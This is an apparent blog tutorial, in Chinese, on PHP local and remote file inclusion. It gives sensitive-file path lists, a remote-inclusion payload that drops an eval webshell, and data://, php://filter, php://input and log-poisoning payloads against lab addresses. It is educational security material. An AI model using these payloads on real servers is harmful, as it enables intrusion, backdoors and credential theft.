@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>初识LFI和RFI | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"Npc小站","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="概念   解释 使用函数去包含任意文件的时候，当包含的文件来源不严谨的时候，当存在包含恶意文件的时候,就可以利用恶心文件进行恶意操作   原理 由于在代码开发的过程中，有时候会遇到相同的代码，不想重复输入，就将代码单独写在一个文件里面，当遇到的时候就直接调用该文件进行运行，而这种方式就会导致客户端可以调用其他的恶意文件，通过恶意文件造成文件包含漏洞。 但是前提也是当文件包含的代码文件被当作一个变">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识LFI和RFI">
+<meta property="og:url" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/index.html">
+<meta property="og:site_name" content="Npc | Blog">
+<meta property="og:description" content="概念   解释 使用函数去包含任意文件的时候，当包含的文件来源不严谨的时候，当存在包含恶意文件的时候,就可以利用恶心文件进行恶意操作   原理 由于在代码开发的过程中，有时候会遇到相同的代码，不想重复输入，就将代码单独写在一个文件里面，当遇到的时候就直接调用该文件进行运行，而这种方式就会导致客户端可以调用其他的恶意文件，通过恶意文件造成文件包含漏洞。 但是前提也是当文件包含的代码文件被当作一个变">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/1684890987_646d656b734ed3e426965.jpeg">
+<meta property="article:published_time" content="2024-06-30T14:24:49.000Z">
+<meta property="article:modified_time" content="2024-07-01T10:54:07.810Z">
+<meta property="article:author" content="Npc">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/1684890987_646d656b734ed3e426965.jpeg"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">😭</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">想s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">45</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">9</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">12</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.</span> <span class="toc-text"> 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text"> 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">2.2.</span> <span class="toc-text"> 特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.3.</span> <span class="toc-text"> 分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.4.</span> <span class="toc-text"> 危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> 利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.</span> <span class="toc-text"> 判断服务器类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 敏感文件读取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.2.</span> <span class="toc-text"> 远程文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text"> 伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.3.1.</span> <span class="toc-text"> php伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.2.</span> <span class="toc-text"> file利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.3.</span> <span class="toc-text"> http利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.4.</span> <span class="toc-text"> data利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.5.</span> <span class="toc-text"> php利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#phpfilter"><span class="toc-number">3.3.5.1.</span> <span class="toc-text"> php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phpinput"><span class="toc-number">3.3.5.2.</span> <span class="toc-text"> php:&#x2F;&#x2F;input</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E8%AF%BB%E5%8F%96"><span class="toc-number">3.4.</span> <span class="toc-text"> 文件包含日志读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#apache"><span class="toc-number">3.4.1.</span> <span class="toc-text"> Apache</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nginx"><span class="toc-number">3.4.2.</span> <span class="toc-text"> Nginx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iis"><span class="toc-number">3.4.3.</span> <span class="toc-text"> IIS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text"> 绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.</span> <span class="toc-text"> 本地文件包含绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.1.</span> <span class="toc-text"> 空字符绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.2.</span> <span class="toc-text"> 超长字符绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.2.</span> <span class="toc-text"> 远程文件包含绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87-2"><span class="toc-number">4.0.2.1.</span> <span class="toc-text"> 空字符绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87-2"><span class="toc-number">4.0.2.2.</span> <span class="toc-text"> 超长字符绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.2.3.</span> <span class="toc-text"> ?绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"><span class="toc-number">4.0.2.4.</span> <span class="toc-text"> 常见特殊字符编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-2"><span class="toc-number">4.0.2.5.</span> <span class="toc-text"> #绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.2.6.</span> <span class="toc-text"> 空格绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text"> 防御方式</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">初识LFI和RFI</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-06-30 22:24:49" itemprop="dateCreated datePublished" datetime="2024-06-30T22:24:49+08:00">2024-06-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-01 18:54:07" itemprop="dateModified" datetime="2024-07-01T18:54:07+08:00">2024-07-01</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">2.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">9m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2>
+<ul>
+<li>
+<p>解释</p>
+<p>使用函数去包含任意文件的时候，当包含的文件来源不严谨的时候，当存在包含恶意文件的时候,就可以利用恶心文件进行恶意操作</p>
+</li>
+<li>
+<p>原理</p>
+<p>由于在代码开发的过程中，有时候会遇到相同的代码，不想重复输入，就将代码单独写在一个文件里面，当遇到的时候就直接调用该文件进行运行，而这种方式就会导致客户端可以调用其他的恶意文件，通过恶意文件造成文件包含漏洞。</p>
+<p>但是前提也是当<mark>文件包含的代码文件被当作一个变量来使用</mark>，并且能够被用户传入参数，如果没有对该变量做相应的安全防护，就可能会引发出文件包含漏洞。</p>
+</li>
+</ul>
+<h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2>
+<h3 id="相关函数"><a class="markdownIt-Anchor" href="#相关函数"></a> 相关函数</h3>
+  <pre class="line-numbers language-none"><code class="language-none">PHP：include() 、include_once()、require()、require_once()
+JSP&#x2F;Servlet：ava.io.file()、java.io.filereader()
+ASP：include file、include virtual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>
+<p>注意:</p>
+<p>PHP中文件包含函数的区别：</p>
+<p>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>
+<p>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>
+<p>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>
+<p>require_once：和 require 类似，不同处在于 require_once 只导入一次。</p>
+</li>
+</ul>
+<h3 id="特征"><a class="markdownIt-Anchor" href="#特征"></a> 特征</h3>
+<ul>
+<li>
+<p>文件包含的漏洞在url可能看出</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php&#x2F;?name&#x3D;x.php
+http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php&#x2F;?file&#x3D;index2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>存在特征并不代表能够利用</p>
+</li>
+<li>
+<ol>
+<li>可以无视文件拓展名</li>
+<li>无条件解析php语法规范的代码</li>
+</ol>
+</li>
+</ul>
+<h3 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h3>
+<ul>
+<li>
+<p>本地文件包含漏洞(LFI)</p>
+<p>在条件允许的情况下,利用本地文件路径加载文件,泄露源码之类的</p>
+</li>
+<li>
+<p>远程文件包含漏洞(RFI)</p>
+<p>在php环境中的利用条件是需要在<code>php.ini</code>中的配置选项中<code>allow_url_fopen</code>和<code>allow_url_include</code>为<code>ON</code></p>
+</li>
+</ul>
+<h3 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害</h3>
+<p>读取WEB服务器上的配置文件以及WEB服务器上的敏感文件，并且若和webshell联动，并将恶意代码执行将造成更大的危害，通常来说远程文件包含漏洞危害更大。</p>
+<h2 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h2>
+<h3 id="判断服务器类型"><a class="markdownIt-Anchor" href="#判断服务器类型"></a> 判断服务器类型</h3>
+<ul>
+<li>利用<code>windows</code>不区分大小写，而<code>linux</code>区分大小写(直接对文件名的大小写进行测试)</li>
+</ul>
+<h4 id="敏感文件读取"><a class="markdownIt-Anchor" href="#敏感文件读取"></a> 敏感文件读取</h4>
+<p>将服务器的敏感文件给读取出来</p>
+<p>例如windows</p>
+<pre class="line-numbers language-none"><code class="language-none">c:\boot.ini                     #查看系统版本
+c:\windows\system32\inetsrv\MetaBase.xml     #IIS配置文件
+c:\windows\repair\sam         #存储Windows的密码
+c:\programFiles\mysql\my.ini     #mysql配置文件，里面可能有密码
+c:\programFiles\mysql\data\mysql\user.MYD     #mysql root密码
+c:\windows\php.ini             #php配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例如linux</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;passwd                     #用户密码
+&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf         #apache2默认配置文件
+&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf   #虚拟网站设置
+&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini       #php相关设置        
+&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf           #apache配置文件        
+&#x2F;etc&#x2F;my.cnf                       #mysql配置文件
+&#x2F;etc&#x2F;sysconfig&#x2F;iptables             #查看防火墙策略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以根据绝对路径和相对路径进行判断</p>
+<h3 id="远程文件读取"><a class="markdownIt-Anchor" href="#远程文件读取"></a> 远程文件读取</h3>
+<p>例如攻击者主机存在这样的php代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php @eval(<span class="token interpolation"><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span></span>);?>"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>那么目标机在远程包含这个主机后就会留下后门</p>
+<p>然后用蚁剑进行连接</p>
+<h3 id="伪协议读取"><a class="markdownIt-Anchor" href="#伪协议读取"></a> 伪协议读取</h3>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p>
+<h4 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议"></a> php伪协议</h4>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#几种常见的伪协议</span>
+file<span class="token punctuation">:</span><span class="token comment">//   #访问本地文件系统</span>
+http<span class="token punctuation">:</span><span class="token comment">//   #访问HTTPs网址</span>
+ftp<span class="token punctuation">:</span><span class="token comment">//     #访问ftp URL</span>
+php<span class="token punctuation">:</span><span class="token comment">//     #访问输入输出流</span>
+zlib<span class="token punctuation">:</span><span class="token comment">//     #压缩流</span>
+data<span class="token punctuation">:</span><span class="token comment">//   #数据</span>
+ssh2<span class="token punctuation">:</span><span class="token comment">//   #security shell2</span>
+expect<span class="token punctuation">:</span><span class="token comment">// #处理交互式的流</span>
+glob<span class="token punctuation">:</span><span class="token comment">//   #查找匹配的文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="file利用方式"><a class="markdownIt-Anchor" href="#file利用方式"></a> file利用方式</h4>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=file://C:/Windows/win.ini</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="http利用方式"><a class="markdownIt-Anchor" href="#http利用方式"></a> http利用方式</h4>
+<p>除了能够跳转到别的网址,还可以进行远程包含进行漏洞执行</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=http://www.baidu.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="data利用方式"><a class="markdownIt-Anchor" href="#data利用方式"></a> data利用方式</h4>
+<p>从php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行任意代码。</p>
+<p><code>这里需要注意若使用data的话需要allow_url_include 和allow_url_fopen为on。</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">URL：http://192.168.10.150/1.php/?name=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+"PD9waHAgcGhwaW5mbygpPz4="是通过base64加密的\<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>\<span class="token operator">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="php利用方式"><a class="markdownIt-Anchor" href="#php利用方式"></a> php利用方式</h4>
+<h5 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> php://filter</h5>
+<p>php://filter 可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启，读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=要读取的文件</span>
+<span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=2.php or ../2.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h5 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h5>
+<p>php://input主要是用来执行php代码的，不过php://input需要以POST提交，这里我们先在URL中添加php://input然后抓包把GET修改为POST，最后在数据包的最后输入想要执行的代码就可以实现代码执行。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=php://input</span>
+<span class="token constant">POST</span><span class="token punctuation">:</span> your_php_code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="文件包含日志读取"><a class="markdownIt-Anchor" href="#文件包含日志读取"></a> 文件包含日志读取</h3>
+<p><code>日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/&lt;?php phpinfo(); ?&gt;时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent，但是请求的信息有可能被url编码之后记录日志，这里可以通过burp来发送请求包来防止被编码，通过相对路径找到日志文件，利用包含漏洞执行。</code></p>
+<ul>
+<li>恶意代码插入到useragent，或者访问过的url中</li>
+<li>日志文件保存恶意代码</li>
+<li>利用文件包含漏洞访问日志文件执行恶意代码</li>
+</ul>
+<h4 id="apache"><a class="markdownIt-Anchor" href="#apache"></a> Apache</h4>
+<p>apache存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">Windows系统：
+apache安装目录&#x2F;logs&#x2F;access.log或者error.log
+linux系统：
+&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log或者error.log
+&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log或者error.log
